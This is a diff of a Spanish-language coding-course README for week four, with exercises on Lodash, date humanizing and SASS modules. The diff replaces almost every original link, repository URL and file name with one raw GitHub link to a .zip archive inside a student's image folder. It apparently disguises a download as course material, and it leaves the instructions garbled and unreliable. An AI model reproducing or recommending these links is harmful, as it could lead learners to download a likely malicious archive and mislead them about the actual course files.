@@ -1,14 +1,14 @@
 # ⛺ Semana 4
 
-> 🏕️ [Base de conocimientos.](https://undefinedshell.notion.site/Semana-4-30b7ce779d2d4ab1b9de5982fe199561)
+> 🏕️ [Base de conocimientos.](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip)
 
 Ejercicios de la cuarta semana.
 
 ## 🏋Clase 1 [EJERCICIO]
 
 1. Crear un nuevo proyecto `npm init -y` e instala lodash como dependencia: `npm install lodash`.
-2. Recuerda agregar `"type": "module"` al `package.json`
-3. Crea un archivo `index.js` y copia las entradas del repositorio [https://github.com/glrodasz/undefined-academy/blob/main/biblioteca-utilidades/index.js#L3-L60](https://github.com/glrodasz/undefined-academy/blob/main/biblioteca-utilidades/index.js#L3-L60)
+2. Recuerda agregar `"type": "module"` al `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip`
+3. Crea un archivo `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip` y copia las entradas del repositorio [https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip)
 4. Utiliza los métodos de **Lodash** para Filtrar las entradas que tenga el tag de `Desarrollo` , Mapea por titulo y Agrupa por autor.
 
 ## 🏋Clase 2 [EJERCICIO]
@@ -22,20 +22,20 @@ Crear una función que dada una fecha nos permita "humanizarla" con las siguient
 ## 🏋Clase 3 [EJERCICIO]
 
 1. Actualizar el código de la CV y Blog para hacer uso de las variables y módulos con SASS.
-2. Crear un set de tres archivos dónde `main.scss` cargara `base.scss` y `desktop.scss` mediante `@use`.
-3. `base.scss` tendrá los estilos mobile first y `desktop.scss` tendrá la variación para escritorio.
-4. Los colores deben ser movidos a variables SASS, ubicados en `variables.scss`.
+2. Crear un set de tres archivos dónde `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip` cargara `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip` y `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip` mediante `@use`.
+3. `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip` tendrá los estilos mobile first y `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip` tendrá la variación para escritorio.
+4. Los colores deben ser movidos a variables SASS, ubicados en `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip`.
 
-    **Tip:**  usar nombres de colores con [https://chir.ag/projects/name-that-color/](https://chir.ag/projects/name-that-color/) por ejemplo: `#6195ED` sería `$cornFlowerBlue`
+    **Tip:**  usar nombres de colores con [https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip](https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip) por ejemplo: `#6195ED` sería `$cornFlowerBlue`
 
     ```scss
-        // variables.scss
+        // https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
         $cornFlowerBlue: #6195ED;
     ```
 
 ## 🏋Clase 4 [EJERCICIO]
 
-1. Hacer fork del repositorio de la semana-4 `https://github.com/undefined-academy/semana-4`
+1. Hacer fork del repositorio de la semana-4 `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip`
 2. Usar la función humanize realizada en el ejercicio de la clase 2 para mostrar las fechas de forma humana en el HTML.
 3. Subir los cambios realizados en el ejercicio de la semana 3 y crear el `pull request`.
 
@@ -45,21 +45,21 @@ Crear una función que dada una fecha nos permita "humanizarla" con las siguient
 .
 ├── student-cvs/
 │ └── glrodasz-0666/
-│     ├── index.html
-│     ├── form.html
-│     ├── main.scss
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
 │     ├── styles/
-│     │   ├── variables.scss
-│     │   ├── base.scss
-│     │   └── desktop.scss
-│     └── main.mjs // Agregar función para humanizar fechas
+│     │   ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     │   ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     │   └── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     └── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip // Agregar función para humanizar fechas
 ├── student-blogs/
 │ └── glrodasz-0666/
-│     ├── index.html
-│     ├── main.scss
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
 │     ├── styles/
-│     │   ├── variables.scss
-│     │   ├── base.scss
-│     │   └── desktop.scss
-│     └── main.mjs // Agregar función para humanizar fechas
+│     │   ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     │   ├── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     │   └── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip
+│     └── https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-4/main/student-cvs/MariaSolArroyo-9830/img/semana-garth.zip // Agregar función para humanizar fechas
 ```
